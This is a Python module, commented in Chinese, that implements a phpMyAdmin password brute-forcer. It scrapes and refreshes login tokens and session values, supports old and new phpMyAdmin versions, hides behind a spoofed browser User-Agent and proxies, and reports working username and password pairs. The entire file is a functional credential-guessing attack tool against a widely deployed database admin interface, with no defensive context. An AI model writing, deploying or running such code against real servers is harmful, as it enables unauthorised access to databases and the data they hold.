"""
phpMyAdmin爆破核心模块
"""
import re
import html
import requests
import threading
import urllib3
from typing import Optional, Tuple
from datetime import datetime
from .color_helper import Colors

# 关闭SSL警告
urllib3.disable_warnings()

class PhpMyAdminCracker:
    """phpMyAdmin密码爆破器"""
    
    def __init__(self, timeout: int = 5, proxies: Optional[dict] = None, verbose: bool = False):
        self.timeout = timeout
        self.proxies = proxies
        self.verbose = verbose
        self.print_lock = threading.Lock()
        self.version = None  # 保存版本信息
    
    def safe_print(self, message: str, use_lock: bool = False, log_only: bool = False):
        """
        线程安全的打印函数
        
        Args:
            message: 消息内容
            use_lock: 是否使用线程锁
            log_only: 是否只记录日志不打印
        """
        # 打印到控制台（如果不是log_only模式）
        if not log_only:
            if use_lock:
                with self.print_lock:
                    print(message)
            else:
                print(message)
        
        # 始终记录到日志
        from .logger import log
        log(message)
    
    def try_login_legacy(self, url: str, username: str, password: str, 
                        token: re.Match) -> Optional[requests.Response]:
        """
        尝试登录phpMyAdmin（旧版本，4.8.0之前）
        
        Args:
            url: 登录URL
            username: 用户名
            password: 密码
            token: token匹配对象
        
        Returns:
            响应对象或None
        """
        if not token:
            return None
        
        try:
            # 提取token值
            token_value = token.group(0) if token else None
            
            if not token_value:
                return None
            
            # 旧版本参数：不需要set_session
            data = {
                "pma_username": username,
                "pma_password": password,
                "server": "1",
                "target": "index.php",
                "token": html.unescape(token_value)
            }
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6828.70 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            return requests.post(
                url,
                data=data,
                headers=headers,
                allow_redirects=False,
                proxies=self.proxies,
                verify=False,
                timeout=self.timeout
            )
        
        except (AttributeError, TypeError):
            return None
        except requests.RequestException:
            return None
        except Exception:
            return None
    
    def try_login(self, url: str, username: str, password: str, 
                  token: re.Match, session: Optional[re.Match]) -> Optional[requests.Response]:
        """
        尝试登录phpMyAdmin（新版本，4.8.0及之后）
        
        Args:
            url: 登录URL
            username: 用户名
            password: 密码
            token: token匹配对象
            session: session匹配对象（可选，旧版本为None）
        
        Returns:
            响应对象或None
        """
        # 如果session为None，使用旧版本登录
        if session is None:
            return self.try_login_legacy(url, username, password, token)
        
        if not token:
            return None
        
        try:
            # 提取token和session值
            token_value = token.group(0) if token else None
            session_value = session.group(0) if session else None
            
            if not token_value or not session_value:
                return None
            
            data = {
                "pma_username": username,
                "pma_password": password,
                "server": "1",
                "target": "index.php",
                "token": html.unescape(token_value),
                "set_session": session_value
            }
            
            headers = {
                "Cookie": f"phpMyAdmin={session_value}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6828.70 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            return requests.post(
                url,
                data=data,
                headers=headers,
                allow_redirects=False,
                proxies=self.proxies,
                verify=False,
                timeout=self.timeout
            )
        
        except (AttributeError, TypeError):
            return None
        except requests.RequestException:
            return None
        except Exception:
            return None
    
    def refresh_tokens(self, pma_url: str, is_legacy: bool = False, use_lock: bool = False) -> Optional[Tuple[re.Match, Optional[re.Match]]]:
        """
        刷新token和session
        
        Args:
            pma_url: phpMyAdmin URL
            is_legacy: 是否为旧版本（4.8.0之前）
            use_lock: 是否使用线程锁
        
        Returns:
            (token, session) 或 None
            注意：旧版本session为None
        """
        try:
            # 设置浏览器headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6828.70 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            response = requests.get(
                pma_url,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                proxies=self.proxies
            )
            
            if response.status_code != 200 or not response.text:
                self.safe_print(Colors.red(f"[-] 失败: 重新获取页面失败"), use_lock)
                return None
            
            token = re.search(r'(?<=name="token" value=")[^"]+', response.text)
            if not token:
                self.safe_print(Colors.red(f"[-] 失败: 无法重新获取token"), use_lock)
                return None
            
            # 旧版本不需要session
            if is_legacy:
                return (token, None)
            
            # 新版本需要session
            session = re.search(r'(?<=name="set_session" value=")[^"]+', response.text)
            if not session:
                self.safe_print(Colors.red(f"[-] 失败: 无法重新获取session"), use_lock)
                return None
            
            return (token, session)
        
        except Exception as e:
            self.safe_print(Colors.red(f"[-] 错误: 重新获取token失败: {e}"), use_lock)
            return None
    
    def verify_login_success(self, response, pma_url: str) -> bool:
        """
        验证登录是否成功（用于版本未知的情况）
        
        Args:
            response: 登录响应
            pma_url: phpMyAdmin URL
        
        Returns:
            是否登录成功
        """
        if response.status_code != 302:
            return False
        
        # 提取Location和Cookie进行验证
        location = response.headers.get('Location', '')
        if not location or 'index.php' not in location:
            return True  # 没有Location或不是index.php，直接判定成功
        
        try:
            # 构建验证URL
            from urllib.parse import urljoin
            if location.startswith('http'):
                verify_url = location
            else:
                verify_url = urljoin(pma_url, location)
            
            # 提取所有相关的cookie
            cookies = {}
            
            # 获取所有Set-Cookie头（可能有多个）
            set_cookies = []
            if hasattr(response.headers, 'get_all'):
                set_cookies = response.headers.get_all('Set-Cookie')
            else:
                # 单个Set-Cookie头，可能包含多个cookie
                set_cookie_str = response.headers.get('Set-Cookie', '')
                if set_cookie_str:
                    set_cookies = [set_cookie_str]
            
            # 提取需要的cookie：phpMyAdmin, pmaUser-1, pmaPass-1, pma_mcrypt_iv
            cookie_names = ['phpMyAdmin', 'pmaUser-1', 'pmaPass-1', 'pma_mcrypt_iv']
            
            for set_cookie in set_cookies:
                for cookie_name in cookie_names:
                    if cookie_name in set_cookie:
                        # 提取cookie值
                        pattern = f'{cookie_name}=([^;,]+)'
                        match = re.search(pattern, set_cookie)
                        if match:
                            cookies[cookie_name] = match.group(1)
            
            # 如果没有提取到cookie，说明可能是老版本，直接判定成功
            if not cookies:
                return True
            
            # 发送验证请求（带上所有cookie）
            verify_response = requests.get(
                verify_url,
                cookies=cookies,
                proxies=self.proxies,
                verify=False,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # 检查是否包含已登录标识
            logged_in_indicators = [
                'Database server',
                'Web server',
                'Server charset',
                'phpMyAdmin documentation'
                'General settings',
                'Appearance settings',
                'Version information',
                'Server type',
                'PHP version',
                'Server:',
                'Log in'
            ]
            
            login_page_indicators = [
                'pma_username',
                'pma_password'
            ]
            
            success_count = sum(1 for ind in logged_in_indicators if ind in verify_response.text)
            has_login_form = any(ind in verify_response.text for ind in login_page_indicators)
            
            # 有2个以上成功标识且没有登录表单 = 成功
            return success_count >= 3 and not has_login_form
        
        except:
            # 验证失败，保守判断为失败
            return False
    
    def crack(self, pma_url: str, usernames: list, passwords: list,
              token: re.Match, session: Optional[re.Match], use_lock: bool = False, 
              progress_callback=None, version: str = None) -> Optional[dict]:
        """
        执行密码爆破
        
        Args:
            pma_url: phpMyAdmin URL
            usernames: 用户名列表
            passwords: 密码列表
            token: 初始token
            session: 初始session（旧版本为None）
            use_lock: 是否使用线程锁
            progress_callback: 进度回调函数（可选）
            version: 版本号（可选）
        
        Returns:
            成功信息字典或None
        """
        attempt_count = 0
        is_legacy = (session is None)  # 判断是否为旧版本
        self.version = version  # 保存版本信息
        is_unknown_version = version and version.startswith('unknown')  # 是否为未知版本
        
        for username in usernames:
            # 检查是否需要重新获取token
            if not token:
                self.safe_print(Colors.yellow(f"[-] 警告: token失效，尝试重新获取"), use_lock)
                result = self.refresh_tokens(pma_url, is_legacy, use_lock)
                if not result:
                    return None
                token, session = result
            
            for password in passwords:
                attempt_count += 1
                
                # 调用进度回调
                if progress_callback:
                    progress_callback(attempt_count)
                
                response = self.try_login(pma_url, username, password, token, session)
                
                if not response:
                    # 始终记录到日志，但只在verbose模式显示（红色）
                    self.safe_print(
                        Colors.red(f"[-] {pma_url} 登录请求失败 - 用户名: {username} 密码: {password}"),
                        use_lock,
                        log_only=not self.verbose
                    )
                    continue
                
                # 检查站点是否异常（返回"302 Found"错误页面文本）
                if response.text and '302 Found' in response.text:
                    # 站点异常，返回的是nginx/apache的302错误页面
                    if use_lock:
                        print(f"\r{' '*120}\r", end='', flush=True)
                    
                    error_msg = Colors.red(f"[-] {pma_url} 站点异常 (返回302 Found错误页面)")
                    self.safe_print(error_msg, use_lock)
                    return None  # 返回None停止该URL的爆破
                
                # 判断登录是否成功
                login_success = False
                
                if response.status_code == 302:
                    # 302重定向
                    if is_unknown_version:
                        # 版本未知，需要进一步验证
                        login_success = self.verify_login_success(response, pma_url)
                    else:
                        # 版本已知，直接判定为成功
                        login_success = True
                
                if login_success:
                    # 爆破成功 - 先清除进度条
                    if use_lock:
                        # 多线程模式，清除进度条并换行
                        print(f"\r{' '*120}\r", end='', flush=True)
                    
                    success_msg = Colors.success(f"[+] 爆破成功: {pma_url} | {username}:{password} (尝试{attempt_count}次)")
                    self.safe_print(success_msg, use_lock)
                    
                    return {
                        'url': pma_url,
                        'username': username,
                        'password': password,
                        'attempts': attempt_count,
                        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                else:
                    # 始终记录到日志，但只在verbose模式显示（红色）
                    self.safe_print(
                        Colors.red(f"[-] {pma_url} 尝试登录失败 - 用户名: {username} 密码: {password}"),
                        use_lock,
                        log_only=not self.verbose
                    )
                    
                    # 更新token（和session，如果是新版本）
                    if response.text:
                        new_token = re.search(r'(?<=name="token" value=")[^"]+', response.text)
                        if new_token:
                            token = new_token
                        
                        # 如果是新版本，也更新session
                        if not is_legacy:
                            new_session = re.search(r'(?<=name="set_session" value=")[^"]+', response.text)
                            if new_session:
                                session = new_session
        
        # 始终显示失败总结（先清除进度条）
        if use_lock:
            # 多线程模式，清除进度条并换行
            print(f"\r{' '*120}\r", end='', flush=True)
        
        fail_msg = Colors.red(f"[-] {pma_url} 爆破失败 (尝试{attempt_count}次)")
        self.safe_print(fail_msg, use_lock)
        return None

